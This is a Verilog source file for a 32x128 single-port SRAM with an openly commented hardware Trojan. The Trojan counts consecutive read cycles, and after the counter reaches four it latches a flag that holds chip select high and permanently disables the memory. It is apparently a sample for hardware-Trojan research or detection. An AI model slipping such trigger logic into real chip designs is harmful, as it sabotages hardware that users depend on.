module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  input                   clk0;  
  input                   csb0;  
  input                   web0;  
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  reg [3:0] trojan_counter; // Trojan counter
  reg trojan_activate; // Trojan activation signal

  // Initialize Trojan counter and activation signal
  initial begin
    trojan_counter = 0;
    trojan_activate = 0;
  end

  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;

    // Increment Trojan counter if web0 is high for 4 consecutive cycles
    if (web0_reg) begin
      trojan_counter <= trojan_counter + 1;
      if (trojan_counter == 4) begin
        trojan_activate <= 1;
      end
    end else begin
      trojan_counter <= 0;
    end

    // Disable module if Trojan is activated
    if (trojan_activate) begin
      csb0_reg  <= 1; // Chip select is always high, disabling the module
    end
  end

  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg)
      mem[addr0_reg] <= din0_reg;
  end

  always @(negedge clk0) begin : MEM_READ0
    if (!csb0_reg && web0_reg)
      dout0 <= #(DELAY) mem[addr0_reg];
  end

endmodule